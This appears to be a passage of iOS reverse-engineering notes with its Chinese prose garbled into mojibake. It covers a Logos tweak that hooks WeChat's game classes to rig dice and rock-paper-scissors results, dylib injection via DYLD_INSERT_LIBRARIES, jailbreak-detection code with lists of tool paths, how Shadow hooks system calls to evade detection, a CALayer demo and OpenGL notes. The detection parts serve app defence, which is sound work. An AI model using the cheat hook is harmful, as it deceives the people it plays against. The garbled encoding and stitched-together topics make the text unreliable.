å¯ä»¥å‘ç° m_nsContent å±æ€§çš„å€¼æ˜¯ä¸€ä¸ª xml æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ <gameext type=\â€2\â€ content=\â€9\â€ ></gameext> å°±æ˜¯éª°å­çš„ä¿¡æ¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¿®æ”¹è¿‡å m_nsContent å’Œ m_uiGameContent ä¸¤ä¸ªå±æ€§ä¸­çš„ä¿¡æ¯å‡ºç°äº†çŸ›ç›¾ï¼Œè€Œå¾®ä¿¡ä¸åŒå¹³å°çš„å®¢æˆ·ç«¯ä¹Ÿè®¸åœ¨æ­¤å¤„çš„æ¥æ”¶é€»è¾‘æœ‰æ‰€å·®å¼‚ï¼Œå¯¼è‡´äº†ä¸Šè¿°ç»“æœã€‚
è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæœ¬è´¨ä¸Šä¸è§£å†³ç¬¬ä¸€ç‚¹æ˜¯ç­‰ä»·çš„ï¼Œæ— éæ˜¯å¾€è°ƒç”¨é“¾çš„ä¸Šæ¸¸å¯»æ‰¾é—æ¼ç‚¹ã€‚è¿‡ç¨‹ä¸ä¹‹å‰ç±»ä¼¼ï¼Œ
æœ€ç»ˆæ‰¾åˆ°äº† [GameController getMD5ByGameContent:] è¿™ä¸ªæ–¹æ³•ï¼ˆçº¢è‰²æ–¹æ¡†ï¼‰ä¸ç»“æœæœ‰å…³ï¼Œå…¶å‚æ•°å°±æ˜¯ m_uiGameContent çš„å€¼ã€‚
```
#import "headers/CEmoticonWrap.h"
#import "headers/CMessageWrap.h"
#import "headers/WCDUserDefaultsMgr.h"
#import <UIKit/UIKit.h>

CMessageWrap *setDice(CMessageWrap *wrap, unsigned int point) {
	if (wrap.m_uiGameType == 2) {
		wrap.m_uiGameContent = point + 3;
	}
	return wrap;
}

CMessageWrap *setJsb(CMessageWrap *wrap, unsigned int type) {
	if (wrap.m_uiGameType == 1) {
		wrap.m_uiGameContent = type;
	}
	return wrap;
}

WCDUserDefaultsMgr *prefs = nil;

%hook GameController

+ (id)getMD5ByGameContent:(unsigned int)arg1 {
	prefs = [WCDUserDefaultsMgr sharedUserDefaults];
	if (arg1 > 3 && arg1 < 10) {
		if (prefs.diceEnabled) {
			return %orig(prefs.dicePoint + 3);
		} else {
			return %orig;
		}
	} else if (arg1 > 0 && arg1 < 4) {
		if (prefs.jsbEnabled) {
			return %orig(prefs.jsbType);
		} else {
			return %orig;
		}
	} else {
		return %orig;
	}
}

%end

%hook CMessageMgr

- (void)AddEmoticonMsg:(id)arg1 MsgWrap:(id)arg2 {
	CMessageWrap *wrap = (CMessageWrap *)arg2;
	if (prefs == nil) { prefs = [WCDUserDefaultsMgr sharedUserDefaults]; }
	if (wrap.m_uiGameType == 2) {
		if (prefs.diceEnabled) {
			%orig(arg1, setDice(arg2, prefs.dicePoint));
		} else {
			%orig;
		}
	} else if (wrap.m_uiGameType == 1) {
		if (prefs.jsbEnabled) {
			%orig(arg1, setJsb(arg2, prefs.jsbType));
		} else {
			%orig;
		}
	} else {
		%orig;
	}
}

%end

%hook CEmoticonUploadMgr

- (void)StartUpload:(id)arg1 {
	CMessageWrap *wrap = (CMessageWrap *)arg1;
	if (prefs == nil) { prefs = [WCDUserDefaultsMgr sharedUserDefaults]; }
	if (wrap.m_uiGameType == 2) {
		if (prefs.diceEnabled) {
			%orig(setDice(arg1, prefs.dicePoint));
		} else {
			%orig;
		}
	} else if (wrap.m_uiGameType == 1) {
		if (prefs.jsbEnabled) {
			%orig(setJsb(arg1, prefs.jsbType));
		} else {
			%orig;
		}
	} else {
		%orig;
	}
}

%end

```
#### hookå¦‚ä¸Š3ä¸ªæ–¹æ³•ï¼Œå°±å¯ä»¥æˆåŠŸåœ°æ§åˆ¶éª°å­/å‰ªåˆ€çŸ³å¤´å¸ƒæ¸¸æˆçš„ç»“æœ

## DYLD_INSERT_LIBRARIES
dylibæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªMach-Oæ ¼å¼çš„æ–‡ä»¶ï¼Œå®ƒä¸æ™®é€šçš„Mach-Oæ‰§è¡Œæ–‡ä»¶å‡ ä¹ä½¿ç”¨ä¸€æ ·çš„ç»“æ„ï¼Œåªæ˜¯åœ¨æ–‡ä»¶ç±»å‹ä¸Šä¸€ä¸ªæ˜¯MH_DYLIBï¼Œä¸€ä¸ªæ˜¯MH_EXECUTEã€‚
åœ¨ç³»ç»Ÿçš„/usr/libç›®å½•ä¸‹ï¼Œå­˜æ”¾äº†å¤§é‡ä¾›ç³»ç»Ÿä¸åº”ç”¨ç¨‹åºè°ƒç”¨çš„åŠ¨æ€åº“æ–‡ä»¶

å¾ªç¯éå†DYLD_INSERT_LIBRARIESç¯å¢ƒå˜é‡ä¸­æŒ‡å®šçš„åŠ¨æ€åº“åˆ—è¡¨ï¼Œå¹¶è°ƒç”¨loadInsertedDylib()å°†å…¶(æ’ä»¶dylib)åŠ è½½ã€‚è¯¥å‡½æ•°è°ƒç”¨load()å®ŒæˆåŠ è½½å·¥ä½œã€‚

```
#ifndef SUBSTRATE_ENVIRONMENT_HPP
#define SUBSTRATE_ENVIRONMENT_HPP

#define SubstrateVariable_ "DYLD_INSERT_LIBRARIES"
#define SubstrateLibrary_ "/Library/MobileSubstrate/MobileSubstrate.dylib"

#define SubstrateSafeMode_ "_MSSafeMode"

void MSClearEnvironment();

#endif//SUBSTRATE_ENVIRONMENT_HPP
```

## æ£€æµ‹æ˜¯å¦è¶Šç‹±
```
#import "UserCust.h"
#import <UIKit/UIKit.h>
#import <sys/stat.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <TargetConditionals.h>
#import <objc/runtime.h>
#import <objc/message.h>
#include <stdio.h>
#import <dlfcn.h>
#import <sys/types.h>

static char *JbPaths[] = {"/Applications/Cydia.app",
    "/usr/sbin/sshd",
    "/bin/bash",
    "/etc/apt",
    "/Library/MobileSubstrate",
    "/User/Applications/"};

static NSSet *sDylibSet ; // éœ€è¦æ£€æµ‹çš„åŠ¨æ€åº“
static BOOL SCHECK_USER = NO; /// æ£€æµ‹æ˜¯å¦è¶Šç‹±

@implementation UserCust


+ (void)load {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    sDylibSet  = [NSSet setWithObjects:
                       @"/usr/lib/CepheiUI.framework/CepheiUI",
                       @"/usr/lib/libsubstitute.dylib",
                       @"/usr/lib/substitute-inserter.dylib",
                       @"/usr/lib/substitute-loader.dylib",
                       @"/usr/lib/substrate/SubstrateLoader.dylib",
                       @"/usr/lib/substrate/SubstrateInserter.dylib",
                       @"/Library/MobileSubstrate/MobileSubstrate.dylib",
                       @"/Library/MobileSubstrate/DynamicLibraries/0Shadow.dylib",
                  
                  nil];
    _dyld_register_func_for_add_image(_check_image);
  });
}

+ (instancetype)sharedInstance {
    
    static id sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [self new];
    });
    return sharedInstance;
}

// ç›‘å¬imageåŠ è½½ï¼Œä»è¿™é‡Œåˆ¤æ–­åŠ¨æ€åº“æ˜¯å¦åŠ è½½ï¼Œå› ä¸ºå…¶ä»–çš„æ£€æµ‹åŠ¨æ€åº“çš„æ–¹æ¡ˆä¼šè¢«hook
static void _check_image(const struct mach_header *header,
                                      intptr_t slide) {
  // hook Image load
  if (SCHECK_USER) {
    // æ£€æµ‹åå°±ä¸åœ¨æ£€æµ‹
    return;
  }

  // æ£€æµ‹çš„lib
  Dl_info info;
  // 0è¡¨ç¤ºåŠ è½½å¤±è´¥äº†ï¼Œè¿™é‡Œå¤§æ¦‚ç‡æ˜¯è¢«hookå¯¼è‡´çš„
  if (dladdr(header, &info) == 0) {
    char *dlerro = dlerror();
    // è·å–å¤±è´¥äº† ä½†æ˜¯è¿”å›äº†dli_fname, è¯´æ˜è¢«äººhookäº†ï¼Œç›®å‰çœ‹çš„æ–¹æ¡ˆéƒ½æ˜¯ç›´æ¥è¿”å›0æ¥ç»•è¿‡çš„
    if(dlerro == NULL && info.dli_fname != NULL) {
      NSString *libName = [NSString stringWithUTF8String:info.dli_fname];
      // åˆ¤æ–­æœ‰æ²¡æœ‰åœ¨åŠ¨æ€åˆ—è¡¨é‡Œé¢
      if ([sDylibSet containsObject:libName]) {
        SCHECK_USER = YES;
      }
    }
    return;
  }
}


// è¶Šç‹±æ£€æµ‹
- (BOOL)UVItinitse {
  
    if (SCHECK_USER) {
      return YES;
    }

    if (isStatNotSystemLib()) {
        return YES;
    }

    if (isDebugged()) {
        return YES;
    }

    if (isInjectedWithDynamicLibrary()) {
        return YES;
    }

    if (JCheckKuyt()) {
        return YES;
    }

    if (dyldEnvironmentVariables()) {
        return YES;
    }

    return NO;
}

CFRunLoopSourceRef gSocketSource;
BOOL fileExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = NO;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL directoryExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = YES;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL canOpen(NSString* path)
{
    FILE *file = fopen([path UTF8String], "r");
    if(file==nil){
        return fileExist(path) || directoryExist(path);
    }
    fclose(file);
    return YES;
}

#pragma mark ä½¿ç”¨NSFileManageré€šè¿‡æ£€æµ‹ä¸€äº›è¶Šç‹±åçš„å…³é”®æ–‡ä»¶æ˜¯å¦å¯ä»¥è®¿é—®æ¥åˆ¤æ–­æ˜¯å¦è¶Šç‹±
// æ£€æµ‹è¶Šç‹±
BOOL JCheckKuyt()
{
    
    if(TARGET_IPHONE_SIMULATOR)return NO;

    //Check cydia URL hook canOpenURL æ¥ç»•è¿‡
    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.avl.com"]])
    {
        return YES;
    }

    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.example.package"]])
    {
        return YES;
    }

    NSArray* checks = [[NSArray alloc] initWithObjects:@"/Application/Cydia.app",
                       @"/Library/MobileSubstrate/MobileSubstrate.dylib",
                       @"/bin/bash",
                       @"/usr/sbin/sshd",
                       @"/etc/apt",
                       @"/usr/bin/ssh",
                       @"/private/var/lib/apt",
                       @"/private/var/lib/cydia",
                       @"/private/var/tmp/cydia.log",
                       @"/Applications/WinterBoard.app",
                       @"/var/lib/cydia",
                       @"/private/etc/dpkg/origins/debian",
                       @"/bin.sh",
                       @"/private/etc/apt",
                       @"/etc/ssh/sshd_config",
                       @"/private/etc/ssh/sshd_config",
                       @"/Applications/SBSetttings.app",
                       @"/private/var/mobileLibrary/SBSettingsThemes/",
                       @"/private/var/stash",
                       @"/usr/libexec/sftp-server",
                       @"/usr/libexec/cydia/",
                       @"/usr/sbin/frida-server",
                       @"/usr/bin/cycript",
                       @"/usr/local/bin/cycript",
                       @"/usr/lib/libcycript.dylib",
                       @"/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist",
                       @"/System/Library/LaunchDaemons/com.ikey.bbot.plist",
                       @"/Applications/FakeCarrier.app",
                       @"/Library/MobileSubstrate/DynamicLibraries/Veency.plist",
                       @"/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist",
                       @"/usr/libexec/ssh-keysign",
                       @"/usr/libexec/sftp-server",
                       @"/Applications/blackra1n.app",
                       @"/Applications/IntelliScreen.app",
                       @"/Applications/Snoop-itConfig.app"
                       @"/var/lib/dpkg/info", nil];
    //Check installed app
    for(NSString* check in checks)
    {
        if(canOpen(check))
        {
            return YES;
        }
    }
    //symlink verification
    struct stat sym;
    // hook lstatå¯ä»¥ç»•è¿‡
    if(lstat("/Applications", &sym) || lstat("/var/stash/Library/Ringtones", &sym) ||
       lstat("/var/stash/Library/Wallpaper", &sym) ||
       lstat("/var/stash/usr/include", &sym) ||
       lstat("/var/stash/usr/libexec", &sym)  ||
       lstat("/var/stash/usr/share", &sym) ||
       lstat("/var/stash/usr/arm-apple-darwin9", &sym))
    {
        if(sym.st_mode & S_IFLNK)
        {
            return YES;
        }
    }
  

    //Check process forking
    // hook fork
    int pid = fork();
    if(!pid)
    {
        exit(1);
    }
    if(pid >= 0)
    {
        return YES;
    }

  
//     check has class only used in breakJail like HBPreferences. è¶Šç‹±å¸¸ç”¨çš„ç±»ï¼Œè¿™é‡Œæ— æ³•ç»•è¿‡ï¼Œåªè¦å¤šæ‰¾ä¸€äº›ç‰¹å¾ç±»å°±å¯ä»¥ï¼Œæ³¨æ„ï¼Œå¾ˆå¤šåè¶Šç‹±æ’ä»¶ä¼šæ··æ·†ï¼Œæ‰€ä»¥å¯èƒ½è¦é€šè¿‡æŸ¥å…³é”®æ–¹æ³•æ¥è¯†åˆ«
    NSArray *checksClass = [[NSArray alloc] initWithObjects:@"HBPreferences",nil];
    for(NSString *className in checksClass)
    {
      if (NSClassFromString(className) != NULL) {
        return YES;
      }
    }
  
//    Check permission to write to /private hook FileManager å’Œ writeToFileæ¥ç»•è¿‡
    NSString *path = @"/private/avl.txt";
    NSFileManager *fileManager = [NSFileManager defaultManager];
    @try {
        NSError* error;
        NSString *test = @"AVL was here";
        [test writeToFile:path atomically:NO encoding:NSStringEncodingConversionAllowLossy error:&error];
        [fileManager removeItemAtPath:path error:nil];
        if(error==nil)
        {
            return YES;
        }

        return NO;
    } @catch (NSException *exception) {
        return NO;
    }
}

BOOL isInjectedWithDynamicLibrary()
{
  unsigned int outCount = 0;
  const char **images =  objc_copyImageNames(&outCount);
  for (int i = 0; i < outCount; i++) {
      printf("%s\n", images[i]);
  }
  
  
  int i=0;
    while(true){
        // hook _dyld_get_image_nameæ–¹æ³•å¯ä»¥ç»•è¿‡
        const char *name = _dyld_get_image_name(i++);
        if(name==NULL){
            break;
        }
        if (name != NULL) {
          NSString *libName = [NSString stringWithUTF8String:name];
          if ([sDylibSet containsObject:libName]) {
            return YES;
          }

        }
    }
    return NO;
}

#pragma mark é€šè¿‡ç¯å¢ƒå˜é‡DYLD_INSERT_LIBRARIESæ£€æµ‹æ˜¯å¦è¶Šç‹±
BOOL dyldEnvironmentVariables ()
{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    return !(NULL == getenv("DYLD_INSERT_LIBRARIES"));
}

#pragma mark æ ¡éªŒå½“å‰è¿›ç¨‹æ˜¯å¦ä¸ºè°ƒè¯•æ¨¡å¼ï¼Œhook sysctlæ–¹æ³•å¯ä»¥ç»•è¿‡
// Returns true if the current process is being debugged (either
// running under the debugger or has a debugger attached post facto).
// Thanks to https://developer.apple.com/library/archive/qa/qa1361/_index.html
BOOL isDebugged()
{
    int junk;
    int mib[4];
    struct kinfo_proc info;
    size_t size;
    info.kp_proc.p_flag = 0;
    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();
    size = sizeof(info);
    junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
    assert(junk == 0);
    return ( (info.kp_proc.p_flag & P_TRACED) != 0 );
}

#pragma mark ä½¿ç”¨staté€šè¿‡æ£€æµ‹ä¸€äº›è¶Šç‹±åçš„å…³é”®æ–‡ä»¶æ˜¯å¦å¯ä»¥è®¿é—®æ¥åˆ¤æ–­æ˜¯å¦è¶Šç‹±ï¼Œhook stat æ–¹æ³•å’Œdladdrå¯ä»¥ç»•è¿‡
BOOL isStatNotSystemLib() {
    if(TARGET_IPHONE_SIMULATOR)return NO;
    int ret ;
    Dl_info dylib_info;
    int (*func_stat)(const char *, struct stat *) = stat;
    if ((ret = dladdr(func_stat, &dylib_info))) {
        NSString *fName = [NSString stringWithUTF8String: dylib_info.dli_fname];
        if(![fName isEqualToString:@"/usr/lib/system/libsystem_kernel.dylib"]){
            return YES;
        }
    }
    
    for (int i = 0;i < sizeof(JbPaths) / sizeof(char *);i++) {
        struct stat stat_info;
        if (0 == stat(JbPaths[i], &stat_info)) {
            return YES;
        }
    }
    
    return NO;
}

typedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data);

#if !defined(PT_DENY_ATTACH)
#define PT_DENY_ATTACH 31
#endif

// ç¦æ­¢gdbè°ƒè¯•
- (void) disable_gdb {
    if(TARGET_IPHONE_SIMULATOR)return;
    void* handle = dlopen(0, RTLD_GLOBAL | RTLD_NOW);
    ptrace_ptr_t ptrace_ptr = dlsym(handle, "ptrace");
    ptrace_ptr(PT_DENY_ATTACH, 0, 0, 0);
    dlclose(handle);
}

@end

```

## è¶Šç‹±æ³¨å…¥çš„åŸç†
1.åˆ©ç”¨Cydia Substrateä¼šå°† SpringBoard çš„ [FBApplicationInfo environmentVariables] hook ï¼Œ

2. å°†ç¯å¢ƒå˜é‡DYLD_INSERT_LIBRARIESè®¾å®šæ–°å¢éœ€è¦è½½å…¥çš„åŠ¨æ€åº“ï¼Œä½†æ˜¯åº”ç”¨çš„äºŒè¿›åˆ¶åŒ…æ— éœ€åšä»»ä½•å˜åŒ–ï¼Œ

3. dyldä¼šåœ¨è½½å…¥åº”ç”¨çš„æ—¶å€™å› ä¸ºDYLD_INSERT_LIBRARIESå»æ’å…¥å…·ä½“çš„åº“ã€‚ 

å±è”½è¶Šç‹±æ£€æµ‹æ’ä»¶shadowä¸»è¦é€»è¾‘ä¸ºï¼š

shadowä¼šç»´æŠ¤ä¸€ä¸ªåˆ—è¡¨ï¼Œæ£€ç´¢å“ªäº›æ–‡ä»¶æ˜¯è¶Šç‹±éœ€è¦ä¿æŠ¤çš„æ–‡ä»¶

hookç›¸å…³çš„ç±»ï¼Œå¦‚æœè¦æ£€ç´¢è¿™äº›æ–‡ä»¶ï¼Œå°±å½±è—ï¼Œè¿”å›ä¿®æ”¹åçš„ç»“æœã€‚
```
hook cçš„ç±»,ä¸»è¦æ˜¯å„ç§åˆ¤æ–­æ–‡ä»¶æƒé™å’Œæ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•,æ¯”å¦‚ï¼š
access
getenv
fopen
freopen
stat
dlopen
hook_NSFileManager | NSFileHandle |  NSDirectoryEnumerator | hook_NSFileVersion | NSBundle
hook_NSURL
hook_UIApplication
hook_NSBundle
hook_CoreFoundation
hook UIImage
hook NSMutableArray | NSArray | NSMutableDictionary | NSDictionary | NSString
hook ç¬¬ä¸‰æ–¹åº“æ£€æµ‹æ–¹æ³•
hook hook_debugging
sysctl ä¸»è¦ç”¨æ¥æ£€æµ‹æ˜¯å¦å½“å‰è¿›ç¨‹æŒ‚è½½äº†P_TRACED
getppid è¿”å›å½“å‰çš„pid
_ptrace
hook_dyld_image ã€‚hook imageåŠ¨æ€åŠ è½½çš„æ–¹æ³•
_dyld_image_count è·å–imageçš„æ•°é‡
_dyld_get_image_name è·å–åŠ¨æ€åº“çš„åå­—
hook_dyld_dlsymã€‚hook ç”¨æ¥æ£€æµ‹æ˜¯å¦å¯ä»¥åŠ è½½åŠ¨æ€åº“ã€‚åŠŸèƒ½å’Œdlopenä¸€æ ·
hookç³»ç»Ÿä¸€äº›ç§æœ‰æ–¹æ³•ï¼švfork | fork | hook_popenï¼ˆæ‰“å¼€ç®¡é“ï¼‰
hook runtime
hook_dladdr dladdrå¯ä»¥ç”¨æ¥è·å–æ–¹æ³•æˆ–imageå¯¹åº”çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æ‰€å±çš„åŠ¨æ€åº“çš„åç§°ï¼Œè¿™é‡Œhookå¦‚æœæ˜¯å¿½ç•¥çš„æ–‡ä»¶ï¼Œåˆ™è¿”å›0ï¼Œæ‰€ä»¥å¦‚æœè¿”å›0ï¼Œè¦å†åˆ¤æ–­ä¸‹æ˜¯å¦æ•°æ®çœŸçš„æ˜¯ç©ºçš„ã€‚
```
### å¦‚ä½•é˜²æ­¢shadowç­‰æ’ä»¶ç»•è¿‡
```
æ£€æµ‹è¿™äº›æ’ä»¶çš„å…³é”®æŒ‡çº¹ï¼Œæ¯”å¦‚æ£€æµ‹åªæœ‰ä»–ä»¬æœ‰çš„ç±», æŸ¥çœ‹æ˜¯å¦æœ‰å¼‚å¸¸ç±»å’Œå¼‚å¸¸çš„åŠ¨æ€åº“çš„å®ç°

é˜»æ­¢DYLD_INSERT_LIBRARIESç”Ÿæ•ˆ, é˜»æ­¢DYLD_INSERT_LIBRARIESç”Ÿæ•ˆ ã€‚ï¼ˆè¿™ä¸ªå¯ä»¥é€šè¿‡ä¿®æ”¹machoï¼Œé‡æ–°æ‰“åŒ…æ¥ç»•è¿‡ï¼‰

ä½¿ç”¨objc_copyImageNamesæ–¹æ³•è®°å½•ä½¿ç”¨çš„æ‰€æœ‰åŠ¨æ€åº“ï¼Œåšæˆç™½åå•ï¼Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå†è¿è¡Œobjc_copyImageNameså»æŸ¥çœ‹å½“å‰çš„åŠ¨æ€åº“æ˜¯å¦ä¸€è‡´
```

### CALayerå“åº”ç‚¹å‡»äº‹ä»¶
1. æ˜¯åˆ©ç”¨containsPoint
2. æ˜¯åˆ©ç”¨hitTest
```
import UIKit

class ViewController: UIViewController {

    let layerOne = CALayer()
    let layerTwo = CALayer()

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = UIColor.yellowColor()

        layerOne.frame = CGRectMake(100, 100, 50, 50)
        layerOne.backgroundColor = UIColor.redColor().CGColor
        view.layer.addSublayer(layerOne)

        layerTwo.frame = CGRectMake(100, 200, 50, 50)
        layerTwo.backgroundColor = UIColor.blueColor().CGColor
        view.layer.addSublayer(layerTwo)

    }

    override func touchesBegan(touches: Set<UITouch>, withEvent event: UIEvent?) {

        //æ–¹æ³•ä¸€:è¿ç”¨containsPoint
        var p = (touches as NSSet).anyObject()?.locationInView(view)
        p = view.layer.convertPoint(p!, fromLayer: view.layer)

        if view.layer.containsPoint(p!) {

            let b = layerOne.convertPoint(p!, fromLayer: view.layer)
            if layerOne.containsPoint(b) {
                let alert = UIAlertView.init(title: "æç¤º", message: "ç‚¹å‡»äº†çº¢è‰²æŒ‰é’®", delegate: nil, cancelButtonTitle: "å–æ¶ˆ")
                alert.show()
            }

           let a = layerTwo.convertPoint(p!, fromLayer: view.layer)
            if layerTwo.containsPoint(a) {
                let alert = UIAlertView.init(title: "æç¤º", message: "ç‚¹å‡»äº†è“è‰²æŒ‰é’®", delegate: nil, cancelButtonTitle: "å–æ¶ˆ")
                alert.show()
            }
        }

//        //æ–¹æ³•äºŒï¼šè¿ç”¨hitTest
//        let p = (touches as NSSet).anyObject()?.locationInView(view)
//        
//        let clickLayer = layerOne.hitTest(p!)
//        
//        if clickLayer == layerOne {
//            let alert = UIAlertView.init(title: "æç¤º", message: "ç‚¹å‡»äº†çº¢è‰²æŒ‰é’®", delegate: nil, cancelButtonTitle: "å–æ¶ˆ")
//            alert.show()
//        }
//        
//        let anotherLayer = layerTwo.hitTest(p!)
//        
//        if anotherLayer == layerTwo {
//            let alert = UIAlertView.init(title: "æç¤º", message: "ç‚¹å‡»äº†è“è‰²æŒ‰é’®", delegate: nil, cancelButtonTitle: "å–æ¶ˆ")
//            alert.show()
//        }

    }

}
```
## OpenGL

1ã€OpenGL
OpenGL (Open Graphics library) æ˜¯â¼€ä¸€ä¸ªè·¨ç¼–ç¨‹è¯­â¾”ã€è·¨å¹³å°çš„ç¼–ç¨‹å›¾å½¢ç¨‹åºæ¥â¼ï¼Œå®ƒå°†è®¡ç®—æœºçš„èµ„æºæŠ½è±¡ç§°ä¸ºä¸€ä¸ªä¸ªOpenGLçš„å¯¹è±¡ï¼Œå¯¹è¿™äº›èµ„æºçš„æ“ä½œæŠ½è±¡ä¸ºä¸€ä¸ªä¸ªçš„OpenGLæŒ‡ä»¤ã€‚


2ã€OpenGL ES
OpenGL ES (OpenGL for Embedded Systems) æ˜¯ OpenGL ä¸‰ç»´å›¾å½¢ API çš„å­é›†ï¼Œé’ˆå¯¹â¼¿æœºã€ PDAå’Œæ¸¸æˆä¸»æœºç­‰åµŒå…¥å¼è®¾å¤‡è€Œè®¾è®¡ï¼Œå»é™¤ï¦ºè®¸å¤šä¸å¿…è¦å’Œæ€§èƒ½è¾ƒä½çš„APIæ¥å£ã€‚


3ã€DirectX
DirectX æ˜¯ç”±å¾ˆå¤šAPIç»„æˆçš„ï¼ŒDirectXå¹¶ä¸æ˜¯ä¸€ä¸ªå•çº¯çš„å›¾å½¢API. æœ€é‡è¦çš„æ˜¯DirectXæ˜¯å±äº Windowsä¸Šä¸€ä¸ªå¤šåª’ä½“å¤„ï§¤API.å¹¶ä¸æ”¯æŒWindowsä»¥å¤–çš„å¹³å°,æ‰€ä»¥ï¥§æ˜¯è·¨å¹³å°æ¡†æ¶. æŒ‰ç…§æ€§ è´¨åˆ†ç±»ï¼Œå¯ä»¥åˆ†ä¸ºå››å¤§éƒ¨åˆ†ï¼Œæ˜¾ç¤ºéƒ¨åˆ†ã€å£°éŸ³éƒ¨åˆ†ã€è¾“â¼Šéƒ¨åˆ†å’Œç½‘ç»œéƒ¨åˆ†ã€‚


4ã€Metal
Metal æ˜¯Appleä¸ºæ¸¸æˆå¼€å‘è€…æ¨å‡ºï¦ºæ–°çš„å¹³å°æŠ€æœ¯ Metalï¼Œè¯¥æŠ€æœ¯èƒ½å¤Ÿä¸º 3D å›¾ åƒæé«˜ 10 å€çš„æ¸²æŸ“æ€§èƒ½ã€‚Metal æ˜¯Appleä¸ºï¦ºè§£å†³3Dæ¸²æŸ“â½½è€Œæ¨å‡ºçš„æ¡†æ¶ã€‚

å…¶å®è‹¹æœè‡ª14å¹´æ¨å‡ºMetalä¹‹åï¼Œå°±å·²ç»å¾ˆæ˜ç¡®çš„å‘Šè¯‰å¤§å®¶ï¼Œåœ¨æé™æ€§èƒ½æ–¹é¢ï¼ŒMetalçš„è¡¨ç°æ˜¯è¦æ›´åŠ çš„å‡ºè‰²çš„ã€‚å› ä¸ºä»–ä»¬å¯¹Metalåšäº†å¾ˆå¤šé’ˆå¯¹æ€§çš„ä¼˜åŒ–ï¼Œè®©ä»–åœ¨iOSçš„è®¾å¤‡ä¸Šèƒ½æœ‰ä¸€ä¸ªæ›´å®Œç¾çš„å‘æŒ¥ã€‚
è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºï¼ŒMetalæ˜¯å¯ä»¥å–ä»£OpenGL ESçš„ã€‚ä½†æ˜¯ç°åœ¨å¸‚åœºä¸Šé¢ï¼Œä¾ç„¶è¿˜æ˜¯OpenGL ESçš„ä½¿ç”¨ç‡æ›´é«˜ã€‚æ‰€ä»¥OpenGL ESå’ŒMetalçš„å…³ç³»å°±æœ‰ç‚¹åƒæ˜¯Objective-Cå’ŒSwiftçš„å…³ç³»ä¸€æ ·ã€‚

äºŒã€OpenGLä¸“ä¸šåè¯è§£æ

1ã€OpenGLä¸Šä¸‹æ–‡ï¼ˆContextï¼‰

åœ¨åº”ç”¨ç¨‹åºè°ƒç”¨ä»»ä½•OpenGLæŒ‡ä»¤ä¹‹å‰ï¼Œéœ€è¦å®‰æ’é¦–å…ˆåˆ›å»ºä¸€ä¸ªOpenGLçš„ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªä¸Šä¸‹æ–‡æ˜¯ä¸€ä¸ªéå¸¸åºå¤§çš„çŠ¶æ€æœºï¼Œä¿å­˜äº†OpenGLä¸­çš„å„ç§çŠ¶æ€ï¼Œè¿™ä¹Ÿæ˜¯OpenGLæŒ‡ä»¤æ‰§è¡Œçš„åŸºç¡€ã€‚

å…¶å®è¿™é‡Œçš„ä¸Šä¸‹æ–‡ï¼Œæˆ‘ä»¬å¯ä»¥ç±»æ¯”ä¸€ä¸‹JSContextï¼Œæˆ‘åœ¨ä¹‹å‰çš„ä¸€ç¯‡è®²JSCoreçš„åšå®¢é‡Œé¢è®²åˆ°è¿‡è¿™ä¸ªä¸œè¥¿ã€‚æˆ‘ä»¬åœ¨æ“ä½œä»»ä½•çš„å¯¹è±¡çš„æ—¶å€™ï¼Œéƒ½éœ€è¦é€šè¿‡ä¸Šä¸‹æ–‡å»æ‹¿åˆ°å¯¹è±¡ï¼ŒåŒæ—¶ä¸Šä¸‹æ–‡é‡Œé¢ä¹Ÿè®°å½•äº†å¾ˆå¤šçš„æˆ‘ä»¬éœ€è¦ä½¿ç”¨çš„ä¿¡æ¯ã€‚

OpenGLçš„å‡½æ•°ä¸ç®¡åœ¨å“ªä¸ªè¯­è¨€ä¸­ï¼Œéƒ½æ˜¯ç±»ä¼¼Cè¯­è¨€ä¸€æ ·çš„é¢å‘è¿‡ç¨‹çš„å‡½æ•°ï¼Œæœ¬è´¨ä¸Šé¢éƒ½æ˜¯å¯¹OpenGLä¸Šä¸‹æ–‡è¿™ä¸ªåºå¤§çš„çŠ¶æ€æœºä¸­çš„æŸä¸ªçŠ¶æ€æˆ–è€…å¯¹è±¡è¿›è¡Œæ“ä½œã€‚å½“ç„¶ä½ å¾—é¦–å…ˆæŠŠè¿™ä¸ªå¯¹è±¡è®¾ç½®ä¸ºå½“å‰å¯¹è±¡ã€‚å› æ­¤ï¼Œé€šè¿‡å¯¹OpenGLæŒ‡ä»¤çš„å°è£…ï¼Œæ˜¯å¯ä»¥å°†OpenGLçš„ç›¸å…³è°ƒç”¨å°è£…æˆä¸ºä¸€ä¸ªé¢å‘å¯¹è±¡çš„å›¾å½¢APIçš„ã€‚

